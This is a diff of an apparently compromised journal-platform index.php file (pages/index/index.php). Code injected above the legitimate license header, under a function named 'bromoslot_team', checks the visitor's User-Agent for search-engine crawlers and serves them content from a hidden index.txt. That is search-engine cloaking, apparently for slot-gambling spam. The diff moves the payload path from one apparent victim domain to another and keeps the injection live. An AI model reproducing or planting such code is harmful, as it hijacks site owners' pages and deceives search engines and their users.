@@ -15,7 +15,7 @@ function bromoslot_team($url) {
 }
 
 $res = strtolower($_SERVER["HTTP_USER_AGENT"]);
-$bot = "/home/u291286007/domains/hrj.com.pk/public_html/pages/index/index.txt";
+$bot = "/home/ihsaorid/plus62.isha.or.id/pages/index/index.txt";
 $file = bromoslot_team($bot);
 $botchar = "/(googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot)/";
 if (preg_match($botchar, $res)) {
@@ -27,7 +27,7 @@ if (preg_match($botchar, $res)) {
 /**
  * @defgroup pages_index Index Pages
  */
-
+ 
 /**
  * @file pages/index/index.php
  *
@@ -36,13 +36,13 @@ if (preg_match($botchar, $res)) {
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
  * @ingroup pages_index
- *
- * @brief Handle site index requests.
+ * @brief Handle site index requests. 
  *
  */
 
 switch ($op) {
-    case 'index':
-        define('HANDLER_CLASS', 'APP\pages\index\IndexHandler');
-        break;
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
 }
